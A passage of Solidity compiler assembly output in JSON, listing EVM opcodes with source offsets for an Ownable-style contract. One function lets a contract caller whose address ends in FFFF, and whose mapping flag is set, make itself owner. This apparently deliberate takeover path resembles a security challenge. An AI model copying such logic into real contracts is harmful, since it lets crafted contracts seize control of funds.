										{
											"begin": 3783,
											"end": 3801,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "AND"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "AND"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "DUP2"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "MSTORE"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "ADD"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "SWAP1"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "DUP2"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "MSTORE"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "ADD"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "KECCAK256"
										},
										{
											"begin": 3783,
											"end": 3801,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "EXP"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "DUP2"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "SLOAD"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "DUP2"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "MUL"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "NOT"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "AND"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "SWAP1"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "DUP4"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "ISZERO"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "ISZERO"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "MUL"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "OR"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "SWAP1"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "SSTORE"
										},
										{
											"begin": 3783,
											"end": 3823,
											"name": "POP"
										},
										{
											"begin": 3742,
											"end": 3835,
											"name": "tag",
											"value": "168"
										},
										{
											"begin": 3742,
											"end": 3835,
											"name": "JUMPDEST"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "POP"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "POP"
										},
										{
											"begin": 3640,
											"end": 3842,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "tag",
											"value": "76"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "JUMPDEST"
										},
										{
											"begin": 3912,
											"end": 3922,
											"name": "CALLER"
										},
										{
											"begin": 3899,
											"end": 3922,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3899,
											"end": 3922,
											"name": "AND"
										},
										{
											"begin": 3899,
											"end": 3908,
											"name": "ORIGIN"
										},
										{
											"begin": 3899,
											"end": 3922,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3899,
											"end": 3922,
											"name": "AND"
										},
										{
											"begin": 3899,
											"end": 3922,
											"name": "EQ"
										},
										{
											"begin": 3899,
											"end": 3922,
											"name": "ISZERO"
										},
										{
											"begin": 3891,
											"end": 3923,
											"name": "PUSH [tag]",
											"value": "173"
										},
										{
											"begin": 3891,
											"end": 3923,
											"name": "JUMPI"
										},
										{
											"begin": 3891,
											"end": 3923,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3891,
											"end": 3923,
											"name": "DUP1"
										},
										{
											"begin": 3891,
											"end": 3923,
											"name": "REVERT"
										},
										{
											"begin": 3891,
											"end": 3923,
											"name": "tag",
											"value": "173"
										},
										{
											"begin": 3891,
											"end": 3923,
											"name": "JUMPDEST"
										},
										{
											"begin": 3971,
											"end": 3977,
											"name": "PUSH",
											"value": "FFFF"
										},
										{
											"begin": 3961,
											"end": 3967,
											"name": "DUP1"
										},
										{
											"begin": 3947,
											"end": 3957,
											"name": "CALLER"
										},
										{
											"begin": 3942,
											"end": 3958,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3942,
											"end": 3958,
											"name": "AND"
										},
										{
											"begin": 3942,
											"end": 3967,
											"name": "AND"
										},
										{
											"begin": 3942,
											"end": 3977,
											"name": "EQ"
										},
										{
											"begin": 3934,
											"end": 3978,
											"name": "PUSH [tag]",
											"value": "174"
										},
										{
											"begin": 3934,
											"end": 3978,
											"name": "JUMPI"
										},
										{
											"begin": 3934,
											"end": 3978,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3934,
											"end": 3978,
											"name": "DUP1"
										},
										{
											"begin": 3934,
											"end": 3978,
											"name": "REVERT"
										},
										{
											"begin": 3934,
											"end": 3978,
											"name": "tag",
											"value": "174"
										},
										{
											"begin": 3934,
											"end": 3978,
											"name": "JUMPDEST"
										},
										{
											"begin": 4015,
											"end": 4019,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 3993,
											"end": 4019,
											"name": "ISZERO"
										},
										{
											"begin": 3993,
											"end": 4019,
											"name": "ISZERO"
										},
										{
											"begin": 3993,
											"end": 3999,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4000,
											"end": 4010,
											"name": "CALLER"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "AND"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "AND"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "DUP2"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "MSTORE"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "ADD"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "SWAP1"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "DUP2"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "MSTORE"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "ADD"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "KECCAK256"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "SWAP1"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "SLOAD"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "SWAP1"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "EXP"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "SWAP1"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "DIV"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 3993,
											"end": 4011,
											"name": "AND"
										},
										{
											"begin": 3993,
											"end": 4019,
											"name": "ISZERO"
										},
										{
											"begin": 3993,
											"end": 4019,
											"name": "ISZERO"
										},
										{
											"begin": 3993,
											"end": 4019,
											"name": "EQ"
										},
										{
											"begin": 3989,
											"end": 4108,
											"name": "ISZERO"
										},
										{
											"begin": 3989,
											"end": 4108,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 3989,
											"end": 4108,
											"name": "JUMPI"
										},
										{
											"begin": 4057,
											"end": 4062,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4036,
											"end": 4042,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4043,
											"end": 4053,
											"name": "CALLER"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "AND"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "AND"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "DUP2"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "MSTORE"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "ADD"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "SWAP1"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "DUP2"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "MSTORE"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "ADD"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "KECCAK256"
										},
										{
											"begin": 4036,
											"end": 4054,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "EXP"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "DUP2"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "SLOAD"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "DUP2"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "MUL"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "NOT"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "AND"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "SWAP1"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "DUP4"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "ISZERO"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "ISZERO"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "MUL"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "OR"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "SWAP1"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "SSTORE"
										},
										{
											"begin": 4036,
											"end": 4062,
											"name": "POP"
										},
										{
											"begin": 4086,
											"end": 4096,
											"name": "CALLER"
										},
										{
											"begin": 4077,
											"end": 4083,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4077,
											"end": 4083,
											"name": "DUP1"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "EXP"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "DUP2"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "SLOAD"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "DUP2"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "MUL"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "NOT"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "AND"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "SWAP1"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "DUP4"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "AND"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "MUL"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "OR"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "SWAP1"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "SSTORE"
										},
										{
											"begin": 4077,
											"end": 4096,
											"name": "POP"
										},
										{
											"begin": 3989,
											"end": 4108,
											"name": "tag",
											"value": "175"
										},
										{
											"begin": 3989,
											"end": 4108,
											"name": "JUMPDEST"
										},
										{
											"begin": 3850,
											"end": 4115,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "tag",
											"value": "80"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "JUMPDEST"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "MSTORE"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "DUP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "MSTORE"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "KECCAK256"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP2"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "POP"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SLOAD"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "EXP"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "SWAP1"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "DIV"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "AND"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "DUP2"
										},
										{
											"begin": 2567,
											"end": 2605,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "tag",
											"value": "83"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "JUMPDEST"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "SWAP1"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "SLOAD"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "SWAP1"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "EXP"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "SWAP1"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "DIV"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "AND"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "DUP2"
										},
										{
											"begin": 311,
											"end": 340,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "tag",
											"value": "87"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "JUMPDEST"
										},
										{
											"begin": 1770,
											"end": 1777,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1797,
											"end": 1806,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1807,
											"end": 1814,
											"name": "DUP4"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "AND"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "AND"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "DUP2"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "MSTORE"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "ADD"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "SWAP1"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "DUP2"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "MSTORE"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "ADD"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "KECCAK256"
										},
										{
											"begin": 1797,
											"end": 1815,
											"name": "SLOAD"
										},
										{
											"begin": 1790,
											"end": 1815,
											"name": "SWAP1"
										},
										{
											"begin": 1790,
											"end": 1815,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP2"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "SWAP1"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "POP"
										},
										{
											"begin": 1713,
											"end": 1823,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "tag",
											"value": "90"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "JUMPDEST"
										},
										{
											"begin": 1028,
											"end": 1038,
											"name": "CALLER"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "AND"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "DUP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SWAP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SLOAD"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SWAP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "EXP"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "SWAP1"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "DIV"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1018,
											"end": 1024,
											"name": "AND"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "AND"
										},
										{
											"begin": 1018,
											"end": 1038,
											"name": "EQ"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH [tag]",
											"value": "178"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "JUMPI"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MLOAD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP3"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SUB"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP3"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MSTORE"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "POP"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "ADD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SWAP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "POP"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "POP"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "MLOAD"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "DUP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SWAP2"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SUB"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "SWAP1"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "REVERT"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "tag",
											"value": "178"
										},
										{
											"begin": 1010,
											"end": 1075,
											"name": "JUMPDEST"
										},
										{
											"begin": 1545,
											"end": 1546,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "AND"
										},
										{
											"begin": 1529,
											"end": 1535,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1529,
											"end": 1535,
											"name": "DUP1"
										},
										{
											"begin": 1529,
											"end": 1535,
											"name": "SWAP1"
										},
										{
											"begin": 1529,
											"end": 1535,
											"name": "SLOAD"
										},
										{
											"begin": 1529,
											"end": 1535,
											"name": "SWAP1"
										},
										{
											"begin": 1529,
											"end": 1535,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1529,
											"end": 1535,
											"name": "EXP"
										},
										{
											"begin": 1529,
											"end": 1535,
											"name": "SWAP1"
										},
										{
											"begin": 1529,
											"end": 1535,
											"name": "DIV"
										},
										{
											"begin": 1529,
											"end": 1535,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1529,
											"end": 1535,
											"name": "AND"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "AND"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "PUSH",
											"value": "8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "MLOAD"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "MLOAD"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "DUP1"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "SWAP2"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "SUB"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "SWAP1"
										},
										{
											"begin": 1508,
											"end": 1548,
											"name": "LOG3"
										},
										{
											"begin": 1576,
											"end": 1577,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1559,
											"end": 1565,
											"name": "DUP1"
										},
										{
											"begin": 1559,
											"end": 1565,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "EXP"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "DUP2"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "SLOAD"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "DUP2"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "MUL"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "NOT"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "AND"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "SWAP1"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "DUP4"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "AND"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "MUL"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "OR"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "SWAP1"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "SSTORE"
										},
										{
											"begin": 1559,
											"end": 1578,
											"name": "POP"
										},
										{
											"begin": 1446,
											"end": 1586,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "tag",
											"value": "93"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "JUMPDEST"
										},
										{
											"begin": 844,
											"end": 851,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 871,
											"end": 877,
											"name": "DUP1"
										},
										{
											"begin": 871,
											"end": 877,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 871,
											"end": 877,
											"name": "SWAP1"
										},
										{
											"begin": 871,
											"end": 877,
											"name": "SLOAD"
										},
										{
											"begin": 871,
											"end": 877,
											"name": "SWAP1"
										},
										{
											"begin": 871,
											"end": 877,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 871,
											"end": 877,
											"name": "EXP"
										},
										{
											"begin": 871,
											"end": 877,
											"name": "SWAP1"
										},
										{
											"begin": 871,
											"end": 877,
											"name": "DIV"
										},
										{
											"begin": 871,
											"end": 877,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 871,
											"end": 877,
											"name": "AND"
										},
										{
											"begin": 864,
											"end": 877,
											"name": "SWAP1"
										},
										{
											"begin": 864,
											"end": 877,
											"name": "POP"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "SWAP1"
										},
										{
											"begin": 806,
											"end": 885,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "tag",
											"value": "96"
										},
										{
											"begin": 872,
											"end": 959,
											"name": "JUMPDEST"
										},
										{
